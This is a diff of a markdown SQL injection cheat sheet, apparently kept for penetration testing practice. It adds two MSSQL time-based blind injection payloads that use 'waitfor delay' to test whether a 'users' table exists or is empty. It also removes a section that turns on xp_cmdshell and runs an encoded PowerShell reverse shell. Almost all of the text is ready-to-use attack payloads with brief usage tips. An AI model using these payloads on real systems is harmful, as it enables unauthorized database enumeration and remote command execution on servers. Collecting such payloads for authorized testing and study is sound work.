@@ -80,6 +80,19 @@ admin' AND IF (1=1, sleep(4),'false')
 which will return after 4 seconds when `admin` exists.
 
 
+For time-based SQLi, do something like this with MSSQL:
+
+```
+admin' UNION SELECT null, null IF EXISTS (SELECT table_catalog, table_name FROM information_schema.columns WHERE table_name = 'users') waitfor delay '0:0:10'
+```
+If you don't want to use the `EXISTS` keyword, you can do stuff like:
+
+```
+admin' UNION SELECT null, null IF ((SELECT COUNT (*) FROM users) = 0) waitfor delay '0:0:10' -- //
+```
+keep in mind if the `users` table doesn't exist, this query does not wait.
+
+
 ## Good enumeration queries for MySQL
 
 ```
@@ -89,16 +102,4 @@ equivalent to `SHOW DATABASES`:
 ```
 SELECT schema_name 
 FROM information_schema.schemata;
-```
-
-## Payloads for RCE
-
-### MSSQL
-
-```
-EXEC sp_configure 'show advanced options',1;
-RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell',1;
-RECONFIGURE;
-EXEC master.dbo.xp_cmdshell 'powershell -enc $ENCODED_REV_SHELL';
 ```
